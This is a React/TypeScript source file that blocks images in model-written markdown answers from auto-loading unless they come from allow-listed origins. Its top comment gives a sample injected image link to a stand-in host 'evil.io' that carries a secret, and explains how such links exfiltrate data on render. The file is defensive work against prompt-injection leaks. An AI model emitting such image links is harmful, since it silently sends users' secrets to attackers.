import React, { useState } from 'react';
import type { Element } from 'hast';
import type { Components } from 'react-markdown';
import { INTERNAL_XYNE_HOSTS } from '../components/Chat/RenderMessageWithHTML/internalLinkUtils';

/**
 * Where an image in model-written markdown may load from on its own.
 *
 * Anything the browser fetches automatically is an exfiltration channel: an
 * injected `![](https://evil.io/p?d=<secret>)` sends the secret the moment the
 * answer renders, before anyone reads it. So an answer may auto-load images
 * only from this app, its APIs, the hosts an admin listed, and inline data.
 * Everything else renders as a placeholder the reader can load on purpose.
 */
export interface AnswerImagePolicy {
  /** The page's own origin; relative URLs resolve against it. */
  pageOrigin: string;
  /** Extra origins that may serve images, such as the API base URL. */
  allowedOrigins: ReadonlySet<string>;
  /** Hostnames that may serve images; a leading `*.` also matches subdomains. */
  allowedHosts: readonly string[];
}

const hostMatches = (host: string, pattern: string): boolean => {
  if (pattern.startsWith('*.')) {
    const bare = pattern.slice(2);
    return host === bare || host.endsWith(`.${bare}`);
  }
  return host === pattern;
};

export const isAllowedAnswerImageSrc = (
  src: string | undefined,
  policy: AnswerImagePolicy,
): boolean => {
  const trimmed = src?.trim();
  if (!trimmed) return false;
  // Inline data never leaves the browser.
  if (/^(data|blob):/i.test(trimmed)) return true;
  let url: URL;
  try {
    url = new URL(trimmed, policy.pageOrigin);
  } catch {
    return false;
  }
  if (url.protocol !== 'http:' && url.protocol !== 'https:') return false;
  if (url.origin === policy.pageOrigin || policy.allowedOrigins.has(url.origin)) return true;
  const host = url.hostname.toLowerCase();
  return policy.allowedHosts.some(pattern => hostMatches(host, pattern.toLowerCase()));
};

const originOf = (value: string | undefined, base: string): string | undefined => {
  if (!value) return undefined;
  try {
    return new URL(value, base).origin;
  } catch {
    return undefined;
  }
};

let cachedPolicy: AnswerImagePolicy | undefined;

/** The policy for this deployment: this origin, the configured API origins, the
 *  known Xyne hosts, and `VITE_ANSWER_IMAGE_HOSTS` (comma-separated). */
export const getAnswerImagePolicy = (): AnswerImagePolicy => {
  if (cachedPolicy) return cachedPolicy;
  const pageOrigin = window.location.origin;
  const env = import.meta.env;
  const allowedOrigins = new Set<string>();
  for (const value of [
    env.VITE_API_URL,
    env.VITE_API_BASE_URL,
    env.VITE_APPS_PUBLIC_BASE_URL,
    env.VITE_CLAW_API_BASE_URL,
  ]) {
    const origin = originOf(value, pageOrigin);
    if (origin) allowedOrigins.add(origin);
  }
  const allowedHosts = [
    ...INTERNAL_XYNE_HOSTS,
    ...(env.VITE_ANSWER_IMAGE_HOSTS ?? '')
      .split(',')
      .map(host => host.trim().toLowerCase())
      .filter(Boolean),
  ];
  cachedPolicy = { pageOrigin, allowedOrigins, allowedHosts };
  return cachedPolicy;
};

const hostOf = (src: string | undefined): string => {
  try {
    return new URL(src ?? '').hostname || 'an unknown source';
  } catch {
    return 'an unknown source';
  }
};

type ImageProps = React.ImgHTMLAttributes<HTMLImageElement>;

interface GuardedMarkdownImageProps extends ImageProps {
  // Must match react-markdown's ExtraProps exactly (with exactOptionalPropertyTypes)
  node?: Element | undefined;
  /** Renders an allowed image; defaults to a plain `<img>`. */
  renderAllowed?: ((props: ImageProps) => React.ReactElement) | undefined;
}

/** The `img` override for every markdown surface that shows model output. */
export const GuardedMarkdownImage = ({
  node: _node,
  renderAllowed,
  ...props
}: GuardedMarkdownImageProps): React.ReactElement => {
  const [loadAnyway, setLoadAnyway] = useState(false);
  if (loadAnyway || isAllowedAnswerImageSrc(props.src, getAnswerImagePolicy())) {
    return renderAllowed ? (
      renderAllowed(props)
    ) : (
      <img {...props} alt={props.alt ?? ''} loading='lazy' />
    );
  }
  return (
    <span className='inline-flex max-w-full items-center gap-2 rounded-md border border-border bg-muted px-2 py-1 text-xs text-muted-foreground'>
      <span className='truncate'>Image from {hostOf(props.src)} not loaded</span>
      <button
        type='button'
        className='shrink-0 text-primary hover:underline'
        onClick={() => setLoadAnyway(true)}
        data-track-category='MESSAGE'
        data-track-name='LOAD_BLOCKED_IMAGE'
      >
        Load
      </button>
    </span>
  );
};

/** For surfaces whose only override is the image guard. */
export const GUARDED_IMAGE_MARKDOWN_COMPONENTS: Components = {
  img: props => <GuardedMarkdownImage {...props} />,
};
